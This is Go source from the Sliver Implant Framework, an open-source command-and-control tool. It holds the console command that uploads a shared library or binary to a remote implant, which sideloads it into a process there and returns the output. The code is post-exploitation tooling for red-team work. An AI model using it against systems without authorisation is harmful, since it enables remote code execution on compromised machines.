package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
	"google.golang.org/protobuf/proto"
)

// SideloadCmd - Sideload a shared library on the remote system
func SideloadCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	binPath := ctx.Args.String("filepath")

	entryPoint := ctx.Flags.String("entry-point")
	processName := ctx.Flags.String("process")
	args := strings.Join(ctx.Args.StringList("args"), " ")

	binData, err := ioutil.ReadFile(binPath)
	if err != nil {
		con.PrintErrorf("%s", err.Error())
		return
	}
	isDLL := (filepath.Ext(binPath) == ".dll")
	ctrl := make(chan bool)
	con.SpinUntil(fmt.Sprintf("Sideloading %s ...", binPath), ctrl)
	sideload, err := con.Rpc.Sideload(context.Background(), &sliverpb.SideloadReq{
		Request:     con.ActiveTarget.Request(ctx),
		Args:        args,
		Data:        binData,
		EntryPoint:  entryPoint,
		ProcessName: processName,
		Kill:        !ctx.Flags.Bool("keep-alive"),
		IsDLL:       isDLL,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("Error: %v", err)
		return
	}

	hostname := getHostname(session, beacon)
	if sideload.Response != nil && sideload.Response.Async {
		con.AddBeaconCallback(sideload.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, sideload)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintSideload(sideload, hostname, ctx, con)
		})
		con.PrintAsyncResponse(sideload.Response)
	} else {
		PrintSideload(sideload, hostname, ctx, con)
	}
}

// PrintSideload - Print the sideload command output
func PrintSideload(sideload *sliverpb.Sideload, hostname string, ctx *grumble.Context, con *console.SliverConsoleClient) {
	if sideload.GetResponse().GetErr() != "" {
		con.PrintErrorf("%s\n", sideload.GetResponse().GetErr())
		return
	}

	var outFilePath *os.File
	var err error
	if ctx.Flags.Bool("save") {
		outFile := filepath.Base(fmt.Sprintf("%s_%s*.log", ctx.Command.Name, hostname))
		outFilePath, err = ioutil.TempFile("", outFile)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
	}
	con.PrintInfof("Output:\n%s", sideload.GetResult())
	if outFilePath != nil {
		outFilePath.Write([]byte(sideload.GetResult()))
		con.PrintInfof("Output saved to %s\n", outFilePath.Name())
	}
}
